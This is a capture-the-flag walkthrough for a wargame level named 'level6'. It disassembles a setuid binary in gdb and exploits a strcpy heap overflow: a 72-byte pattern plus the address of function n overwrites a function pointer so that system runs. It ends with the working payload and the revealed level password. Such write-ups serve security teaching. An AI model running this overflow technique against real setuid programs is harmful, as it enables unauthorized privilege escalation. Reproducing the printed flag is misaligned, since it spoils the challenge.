What do we have?

	$ ll
	total 17
	dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 ./
	dr-x--x--x  1 root   root    340 Sep 23  2015 ../
	-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
	-rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
	-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6*
	-rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
	-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile

A `level6` binary. Let's check the assembly:

	$ gdb level6
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x0804847c <+0>:	push   %ebp
	0x0804847d <+1>:	mov    %esp,%ebp
	=> 0x0804847f <+3>:	and    $0xfffffff0,%esp
	0x08048482 <+6>:	sub    $0x20,%esp
	0x08048485 <+9>:	movl   $0x40,(%esp)
	0x0804848c <+16>:	call   0x8048350 <malloc@plt>
	0x08048491 <+21>:	mov    %eax,0x1c(%esp)
	0x08048495 <+25>:	movl   $0x4,(%esp)
	0x0804849c <+32>:	call   0x8048350 <malloc@plt>
	0x080484a1 <+37>:	mov    %eax,0x18(%esp)
	0x080484a5 <+41>:	mov    $0x8048468,%edx
	0x080484aa <+46>:	mov    0x18(%esp),%eax
	0x080484ae <+50>:	mov    %edx,(%eax)
	0x080484b0 <+52>:	mov    0xc(%ebp),%eax
	0x080484b3 <+55>:	add    $0x4,%eax
	0x080484b6 <+58>:	mov    (%eax),%eax
	0x080484b8 <+60>:	mov    %eax,%edx
	0x080484ba <+62>:	mov    0x1c(%esp),%eax
	0x080484be <+66>:	mov    %edx,0x4(%esp)
	0x080484c2 <+70>:	mov    %eax,(%esp)
	0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
	0x080484ca <+78>:	mov    0x18(%esp),%eax
	0x080484ce <+82>:	mov    (%eax),%eax
	0x080484d0 <+84>:	call   *%eax
	0x080484d2 <+86>:	leave  
	0x080484d3 <+87>:	ret    
	End of assembler dump.

`malloc` of 64 put into a variable (+9 to +21), `malloc` of 4 put into a variable (+25 to +37), call a function and put in the second variable (+41 to +50), do a `strcpy` with `argv[1]` (+52 to 73), and do a call as pointer to function with the second variable (+78 to +84).

To not do the same error as in the previous exercise...

	(gdb) info functions
	All defined functions:

	[...]
	0x08048454  n
	0x08048468  m
	0x0804847c  main
	[...]
	
	(gdb) disas m
	Dump of assembler code for function m:
	0x08048468 <+0>:	push   %ebp
	0x08048469 <+1>:	mov    %esp,%ebp
	0x0804846b <+3>:	sub    $0x18,%esp
	0x0804846e <+6>:	movl   $0x80485d1,(%esp)
	0x08048475 <+13>:	call   0x8048360 <puts@plt>
	0x0804847a <+18>:	leave  
	0x0804847b <+19>:	ret    
	End of assembler dump.

Just a `puts` of a string.

	(gdb) disas n
	Dump of assembler code for function n:
	0x08048454 <+0>:	push   %ebp
	0x08048455 <+1>:	mov    %esp,%ebp
	0x08048457 <+3>:	sub    $0x18,%esp
	0x0804845a <+6>:	movl   $0x80485b0,(%esp)
	0x08048461 <+13>:	call   0x8048370 <system@plt>
	0x08048466 <+18>:	leave  
	0x08048467 <+19>:	ret    
	End of assembler dump.

A `system` call.

`strcpy` is a function with a known problem regarding buffer overflows, so that's what we'll use to trigger a call to `n`. By using the pattern generator (https://wiremask.eu/tools/buffer-overflow-pattern-generator/), we can get the offset, which is at 72 bytes (`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3`). Then, the address of `n` (`0x08048454`). To turn the `\xXX` sequences into raw bytes, we'll also use the `$'[...]'` expand of the shell.

And...

	$ ./level6 $'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3\x54\x84\x04\x08'
	f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
